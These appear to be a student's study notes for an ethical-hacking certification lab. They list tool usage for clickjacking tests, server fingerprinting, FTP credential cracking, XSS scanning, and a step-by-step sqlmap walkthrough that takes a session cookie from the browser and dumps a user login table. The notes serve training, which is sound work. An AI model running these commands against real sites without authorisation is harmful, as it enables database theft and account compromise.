# Test website for clickjacking
If ClickJackPOC.py doesn't work, try www.clickjacker.io

# Finding HTTP and Web servers for websites
- Can use http-recon
- If site isn't reachable with the tool, try opening it with firefox or chrome
- Press F12 -> Network tab -> Refresh page
- Look under response headers

# Cracking FTP Credentials
- REMEMBER THERE ARE PROVIDED WORDLISTS
- Check both the one on Desktop and in Module 13 in Parrot Machine

# Finding Load Balancing Svc
1. dig <site> -> Take sites from ANSWER SECTION
2. lbd <answer_site>

# CMS
Content management system refers to the system used by the website (eg. WordPress, SquareSpace)

# Banner Grabbing
wget <ip> -q -S (gives etag)
- Make sure to use an actual ip and not a hostname

# Web application snooping
- Use Burp Suite and setup a proxy to observe the structure

# Check for XSS
- Navigate to PwnXSS folder
- python3 pwnxss.py -u <url>

# SQL Injection Attack
The question asks to get number of users and gave login credentials
- Login to target site and select "View Profile"
- Open Developer tools (F12), go to console and type "document.cookie"
- Eg. "mscope=*********; ui-tabs-1=0"
- Open a terminal
- sqlmap -u "<current_url>" --cookie="mscope=*********;" --dbs
    - Returns all available databases 
    - (Eg. we're selecting moviescope)
- sqlmap -u "<current_url>" --cookie="mscope=*********; ui-tabs-1=0" -D moviescope --tables
    - Returns all tables 
    - (Eg. we want User_Login)
- sqlmap -u "<current_url>" --cookie="mscope=*********; ui-tabs-1=0" -D moviescope -T User_Login --dump
    - Returns a list of all content in that table
    - (Eg. This table has 9 users)

# Detect Session Hijacking
- Open .pcap file in Wireshark
- Filter by ARP and see there is a lot of requests